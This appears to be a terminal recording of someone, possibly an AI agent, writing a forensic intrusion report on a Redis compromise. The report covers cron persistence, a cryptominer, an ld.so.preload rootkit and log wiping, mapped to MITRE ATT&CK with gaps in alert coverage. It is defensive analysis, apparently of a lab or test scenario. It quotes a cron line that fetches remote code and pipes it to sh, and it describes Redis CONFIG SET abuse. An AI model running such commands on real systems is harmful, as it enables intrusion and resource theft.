[146.99738, "i", "cat << 'EOF' > /app/intrusion-report.md\n# Intrusion Report: Post-Compromise Campaign Analysis\n\n## Executive Summary\nOn host `redis-prod-01`, an external threat actor (`198.51.100.170`) gained access by abusing an unauthenticated Redis service exposed to all interfaces (`0.0.0.0`). The attacker leveraged Redis `CONFIG SET` commands to write a persistence payload into the root crontab, dropped an XMRig cryptominer (`kdevtmpfsi`), established userland rootkit persistence via `/etc/ld.so.preload`, staged a loadable module exploit (`exp.so`), and performed log wiping. EDR alerting (`/sas/alerts.json`) detected only the cryptominer process and crontab file, missing the silent `LD_PRELOAD` rootkit, staged module, and log wipe activity.\n\n## Entities & Indicators of Compromise (IoCs)\n\n| Indicator Type | Value | Citation |\n|---|---|---|\n| Attacker Origin IP | `198.51.100.170` | `/disk/var/log/auth.log:208`, `/sas/cti/advisory.txt:5` |\n| C2 Infrastructure Domain | `update-redis.example.cn` | `/disk/var/lib/.cache/.wiped.bin:1` |\n| Cryptomining Pool | `stratum+tcp://xmr.redis.evil:3333` | `/disk/tmp/.redis/kdevtmpfsi:4`, `/disk/tmp/.redis/exp.so:4` |\n| Monero Wallet | `4A00000000000000000031c7d95fb9f3` | `/disk/tmp/.redis/kdevtmpfsi:5`, `/disk/tmp/.redis/exp.so:5` |\n| Miner Process File | `/tmp/.redis/kdevtmpfsi` | `/disk/tmp/.redis/kdevtmpfsi:1`, `/sas/alerts.json` (ALERT-01) |\n| Staged Exploit Module | `/tmp/.redis/exp.so` | `/disk/tmp/.redis/exp.so:1` |\n| Preload Rootkit File | `/etc/ld.so.preload` -> `/lib/.hide.so` | `/disk/etc/ld.so.preload:1` |\n| Root Crontab File | `/var/spool/cron/crontabs/root` | `/disk/var/spool/cron/crontabs/root:4`, `/sas/alerts.json` (ALERT-02) |\n| Residual Cache Artifact | `/var/lib/.cache/.wiped.bin` | `/disk/var/lib/.cache/.wiped.bin:1` |\n\n## Comprehensive Attack Chain Mapping (MITRE ATT&CK)\n\n### 1. Initial Access & Execution: External Remote Services (T1133) & Unix Shell (T1059.004)\n- **Description**: The host ran Redis 6.x bound to `0.0.0.0` with `protected-mode no` and no password configured (`/disk/etc/redis/redis.conf:3`).\n- **Mechanism**: Attacker connected directly over TCP 6379, issued `CONFIG SET dir /var/spool/cron/crontabs` and `CONFIG SET dbfilename root`, and wrote a malicious cron command.\n- **Additional SSH Brute-Force**: SSH authentication logs confirm concurrent brute-force attempts from `198.51.100.170` resulting in successful root password authentication (`/disk/var/log/auth.log:208`).\n- **Alert Coverage**: Partially covered by `/sas/alerts.json` (ALERT-03).\n\n### 2. Persistence: Cron (T1053.003)\n- **Description**: Malicious crontab entry added to `/var/spool/cron/crontabs/root`.\n- **Payload**: Executed every minute (`* * * * * root curl hxxp://198.51.100.170/x | sh`), re-downloading and re-executing payloads (`xmrig`, `pgdaemon`, `php`, `redis`, `wget`) (`/disk/var/spool/cron/crontabs/root:4`).\n- **Alert Coverage**: Covered by `/sas/alerts.json` (ALERT-02).\n\n### 3. Impact: Resource Hijacking (T1496)\n- **Description**: Deployment of Monero cryptominer process (`kdevtmpfsi`, PID 1337).\n- **Details**: Mining against pool `stratum+tcp://xmr.redis.evil:3333` using wallet `4A00000000000000000031c7d95fb9f3`, generating sustained high CPU consumption (`/disk/tmp/.redis/kdevtmpfsi:3`).\n- **Alert Coverage**: Covered by `/sas/alerts.json` (ALERT-01).\n\n### 4. Stealth & Defense Evasion: Dynamic Linker Hijacking (T1574.006) [SILENT]\n- **Description**: Modification of `/etc/ld.so.preload` to inject userland library rootkit `/lib/.hide.so` (`/disk/etc/ld.so.preload:1`).\n- **Impact**: Intercepts C library functions to hide attacker processes (`kdevtmpfsi`), files (`/tmp/.redis/`), and network connections.\n- **Alert Coverage**: **SILENT** — missing from `/sas/alerts.json`.\n\n### 5. Stealth & Persistence: Kernel Modules / Loadable Module (T1547.006 / T1574.006) [SILENT]\n- **Description**: Staged shared object binary `/tmp/.redis/exp.so` configured as a loadable kernel module rootkit staged for installation at `/lib/modules/.../exp.so` (`/disk/tmp/.redis/exp.so:3`).\n- **Alert Coverage**: **SILENT**"]
[146.997418, "i", " — missing from `/sas/alerts.json`.\n\n### 6. Anti-Forensics: Indicator Removal on Host (T1070) [SILENT]\n- **Description**: Attacker wiped primary system logs to cover activities. Partial recovery retrieved residual cache data pointing to C2 domain `update-redis.example.cn` and IP `198.51.100.170` (`/disk/var/lib/.cache/.wiped.bin:1`).\n- **Alert Coverage**: **SILENT** — missing from `/sas/alerts.json`.\nEOF\n"]
